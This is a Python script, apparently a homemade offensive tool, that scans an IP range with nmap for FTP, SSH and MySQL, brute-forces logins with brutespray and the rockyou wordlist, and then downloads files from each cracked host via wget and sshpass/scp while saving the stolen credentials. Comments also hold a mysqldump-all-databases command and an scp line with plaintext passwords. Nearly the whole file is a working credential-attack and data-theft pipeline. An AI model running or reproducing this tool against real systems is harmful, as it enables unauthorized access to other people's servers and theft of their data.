import subprocess
import argparse
import time
import re
from pathlib import Path
import os

#mysqldump --user=root --password=toor --host=192.168.111.145 --protocol=tcp --port=3306 --all-databases > dump.sql


def _parse_args():
	parser = argparse.ArgumentParser(description='main.py')
	parser.add_argument('ip', type=str, help='IP or IP range to search for defaults')
	parser.add_argument('-t', '--threads', type=int, default=2, help='Number of threads to run on')
	parser.add_argument('-c', '--clean', type=bool, default=True, help='Clean up files from previous runs')
	parser.add_argument('-f', '--filepath', type=str, default=None, help='Specify a single filepath to retrieve')
	parser.add_argument('-ftpfl', '--ftp_files', type=str, default="ftp_filepaths.txt", help='Specify a .txt file listing the files to retrieve from ftp servers')
	parser.add_argument('-sshfl', '--ssh_files', type=str, default='ssh_filepaths.txt', help="Specify a .txt file listing the files to retrieve from ssh servers")
	parser.add_argument('-ftpr', '--ftp_recursion_depth', type=int, default=5, help="Max levels of recursive downloading for each target directory")
	parser.add_argument('-v', '--verbose', action="store_true", help="Include this flag to display error output for ftp")
	args = parser.parse_args()
	return args

def clean_up():
	cmd = "rm -f output.gnmap; rm -rf brutespray-output; rm -rf ftp; rm -rf mysql; " 
	proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, shell=True)
	# following line runs so we wait until we're done cleaning up
	out, err = proc.communicate()

def run_nmap(ip_range: str):
	cmd = "nmap -p21,22,3306 --open -sV " + ip_range + " -oG output.gnmap"
	proc = subprocess.Popen(cmd.split(), stdout=subprocess.PIPE)
	output, error = proc.communicate()
	# print(output.decode('utf-8'))

def run_brutespray(threads: int):
	brute_cmd = "brutespray -f output.gnmap -U ../users.txt -P ../rockyou2.txt -t " + str(threads) + " -c"
	brute_poc = subprocess.Popen(brute_cmd.split(), stdout=subprocess.PIPE)
	brute_out, brute_err = brute_poc.communicate()
	# print(brute_out.decode('utf-8'))

def get_ftp_files(ip, username, password, filepath=None, recursion_depth=5, verbose=False):
	filename = filepath.split('/')
	filename = filename[-1]
	mkdir = "mkdir -p ftp/" + username + "; cd ftp/" + username + ";"
	# get = "curl ftp://" + username + ":" + password + "@" + ip + filepath + " -o " + filename + ";"
	get = "wget ftp://" + username + ":" + password + "@" + ip + filepath + " -r -l " + str(recursion_depth + 1) + ";"
	cmd = mkdir + get
	devnull = subprocess.STDOUT if verbose else open(os.devnull, 'w') # inspired by stack overflow
	if verbose:
		proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, shell=True)
	else:
		proc = subprocess.Popen(cmd, stdout=devnull, stderr=devnull, shell=True)
	out, err = proc.communicate()
	if err is not None:
		print("\tF\tailed to grab all files")

def get_ssh_files(ip, username, password, filepath=None):
	# filename = filepath.split('/')
	# filename = filename[-1]
	mkdir = "mkdir -p " + "ssh/" + username + "/" + ip + ";cd ssh/" + username + "/" + ip + "; "
	cmd = mkdir + "sshpass -p \"" + password + "\" scp -r " + username + "@" + ip + ":"+ filepath + " . " + ";"
	proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, shell=True)
	out, err = proc.communicate()

def make_ftp_folder():
	cmd = "mkdir ftp"
	proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, shell=True)
	out, err = proc.communicate()

def make_ssh_folder():
	cmd = "mkdir ssh"
	proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, shell=True)
	out, err = proc.communicate()

def show_cracked_info():
	cracked_cmd = "cat brutespray-output/*"
	cracked_proc = subprocess.Popen(cracked_cmd.split(), stdout=subprocess.PIPE)
	cracked_out, cracked_err = cracked_proc.communicate()
	print(cracked_out.decode('utf-8'))

if __name__ == "__main__":
	start_time = time.time()
	args = _parse_args()
	# clean up files from previous runs to avoid overlap
	if args.clean:
		clean_up()
	# run nmap
	run_nmap(args.ip)
	print('''  ___     ___    _   _   _____   _   _    ___   \n \
| _ )   | _ \  | | | | |_   _| | | | |  / __|     \n \
| _ \   |   /  | |_| |   | |   | |_| |  \__ \     \n \
|___/   |_|_\   \___/   _|_|_   \___/   |___/     \n \
_|"""""|_|"""""|_|"""""|_|"""""|_|"""""|_|"""""|    \n \
"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'  ''')                                                               
	print("==== nmap done")
	# run brutespray
	run_brutespray(args.threads)
	print("==== brutespray done")
	# get files from brutespray
	ftp_file = Path("./brutespray-output/21-ftp-success.txt")
	ssh_file = Path("./brutespray-output/22-ssh-success.txt")
	# mysql_file = Path("./brutespray-output/3306-mysql-success.txt")
	# grab files from ftp servers
	if ftp_file.is_file():
		print("==== retreiving info from ftp servers")
		make_ftp_folder()
		with open("./brutespray-output/21-ftp-success.txt", "r") as f:
			for line in f:
				regex = re.compile(r"Host: (.+) User: (.+) Password: (.+) ")
				match = regex.search(line)
				with open("ftp_cracked", "a+") as cracked:
					cracked.write(match.group(2) + ":" + match.group(3))
				if match is not None:
					print("\tgrabbing ftp files from " + str(match.group(2)))
					if not args.filepath:
						with open(args.ftp_files) as files:
							for filename in files:
								filename = filename.split()[0]
								get_ftp_files(match.group(1), match.group(2), match.group(3), filename, args.ftp_recursion_depth, args.verbose)
					else: 
						get_ftp_files(match.group(1), match.group(2), match.group(3), args.filepath, args.ftp_recursion_depth, args.verbose)
	# get scp files
	if ssh_file.is_file():
		print("==== retreiving info from ssh servers")
		make_ssh_folder()
		with open("./brutespray-output/22-ssh-success.txt", "r") as f:
			for line in f:
				regex = re.compile(r"Host: (.+) User: (.+) Password: (.+) ")
				match = regex.search(line)
				with open("ssh_cracked", "a+") as cracked:
					cracked.write(match.group(2) + ":" + match.group(3))
				if match is not None:
					print("\tgrabbing scp files from " + str(match.group(2)))
					if not args.filepath:
						with open(args.ssh_files) as files:
							for path in files:
								get_ssh_files(match.group(1), match.group(2), match.group(3), path)
					else: 
						get_ssh_files(match.group(1), match.group(2), match.group(3), args.filepath)

	print("Elapsed time: ", time.time() - start_time, 's')
# maybe use this vvv for ssh
# sshpass -p 'SuperStrongPassword' scp -C -r admin@192.168.111.142:/home/admin .

	#show_cracked_info()
	#print("===== Cracked info ========")
